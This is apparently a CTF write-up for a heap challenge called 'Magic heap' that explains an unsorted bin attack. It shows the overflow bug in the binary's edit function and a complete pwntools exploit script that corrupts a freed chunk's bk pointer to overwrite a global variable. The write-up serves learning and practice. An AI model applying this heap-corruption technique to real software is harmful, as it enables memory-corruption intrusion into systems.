## Magic heap  
This is the practice of **Unsorted bin attack**.  
I have change **fd** to make fastbin corruption in before, this time I will change **bk** of unsorted bin to make unsorted bin attack!  
[Want to know what is unsorted bin attack?](https://github.com/shinmao/WhyNot-HEAP-Exploitation/tree/master/Unsorted-Bin-Attack)  
  
### Vulnerability  
```C
if(heaparray[idx]){
		printf("Size of Heap : ");
		read(0,buf,8);
		size = atoi(buf);
		printf("Content of heap : ");
		read_input(heaparray[idx] ,size);
```  
The edit() function of program can help us make a heap overflow.  
  
### Ideas  
1. Free the second chunk.  
2. Edit the first chunk to overflow and change the bk of second chunk to **target - 0x10**.  
In this step, we need to be careful to remain the size of second chunk, or there will be an size error when **unlink** check the prev_size.
3. Now, here is the most interesting part in Unsorted bin attack.
The unlink for unsorted bin will not check the double linked list.
Besides, the last one of bin will become the **victim**, and fd of **bck** will become where your next malloc()!!  
4. Then, you can make the magic bigger :love:  

### Payload  
```python
#!/usr/bin/env python
from pwn import *

DEBUG = 1
if DEBUG:
    r = process('./magicheap-033333be91a77ff2041c2b3f7d5906007ef132e3')
else:
    r = remote('csie.ctf.tw',10144)

e = ELF('./magicheap-033333be91a77ff2041c2b3f7d5906007ef132e3')
l = ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

def allocate(size,data):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.send(str(size)+'\n')
    r.recvuntil(':')
    r.send(data)

def edit(idx,size,data):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.send(str(idx)+'\n')
    r.recvuntil(':')
    r.send(str(size)+'\n')
    r.recvuntil(':')
    r.send(data+'\n')

def free(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.send(str(idx)+'\n')


magic = 0x6020c0
allocate(0x30,'ddaa')   #0
allocate(0x160,'ddaa')   #1
allocate(0x30,'ddaa')    #2

free(1)
edit(0,0x50,'a'*0x30 + p64(0x0) + p64(0x170) + p64(0x666666) + p64(0x6020c0 - 0x10))

allocate(0x160,'ddaa')

r.recvuntil(':')
r.sendline('4869')

r.interactive()
```
